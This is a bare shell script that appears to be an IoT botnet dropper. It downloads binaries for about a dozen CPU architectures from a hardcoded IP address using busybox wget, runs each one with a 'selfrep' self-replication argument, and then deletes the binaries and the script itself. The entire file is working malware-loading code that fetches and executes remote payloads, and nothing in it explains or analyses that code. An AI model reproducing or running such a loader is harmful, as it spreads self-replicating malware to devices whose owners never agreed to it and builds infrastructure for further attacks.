#!/bin/sh
/bin/busybox wget http://45.95.146.126/jklarm -O jklarm;/bin/busybox chmod +x jklarm;./jklarm selfrep;/bin/busybox rm -rf jklarm
/bin/busybox wget http://45.95.146.126/jklarm5 -O jklarm5;/bin/busybox chmod +x jklarm5;./jklarm5 selfrep;/bin/busybox rm -rf jklarm5
/bin/busybox wget http://45.95.146.126/jklarm6 -O jklarm6;/bin/busybox chmod +x jklarm6;./jklarm6 selfrep;/bin/busybox rm -rf jklarm6
/bin/busybox wget http://45.95.146.126/jklarm7 -O jklarm7;/bin/busybox chmod +x jklarm7;./jklarm7 selfrep;/bin/busybox rm -rf jklarm7
/bin/busybox wget http://45.95.146.126/jklm68k -O jklm68k;/bin/busybox chmod +x jklm68k;./jklm68k selfrep;/bin/busybox rm -rf jklm68k
/bin/busybox wget http://45.95.146.126/jklmips -O jklmips;/bin/busybox chmod +x jklmips;./jklmips selfrep;/bin/busybox rm -rf jklmips
/bin/busybox wget http://45.95.146.126/jklmpsl -O jklmpsl;/bin/busybox chmod +x jklmpsl;./jklmpsl selfrep;/bin/busybox rm -rf jklmpsl
/bin/busybox wget http://45.95.146.126/jklppc -O jklppc;/bin/busybox chmod +x jklppc;./jklppc selfrep;/bin/busybox rm -rf jklppc
/bin/busybox wget http://45.95.146.126/jklsh4 -O jklsh4;/bin/busybox chmod +x jklsh4;./jklsh4 selfrep;/bin/busybox rm -rf jklsh4
/bin/busybox wget http://45.95.146.126/jklspc -O jklspc;/bin/busybox chmod +x jklspc;./jklspc selfrep;/bin/busybox rm -rf jklspc
/bin/busybox wget http://45.95.146.126/jklx86 -O jklx86;/bin/busybox chmod +x jklx86;./jklx86 selfrep;/bin/busybox rm -rf jklx86
/bin/busybox wget http://45.95.146.126/jklarc -O jklarc;/bin/busybox chmod +x jklarc;./jklarc selfrep;/bin/busybox rm -rf jklarc
/bin/busybox rm -rf wget.sh
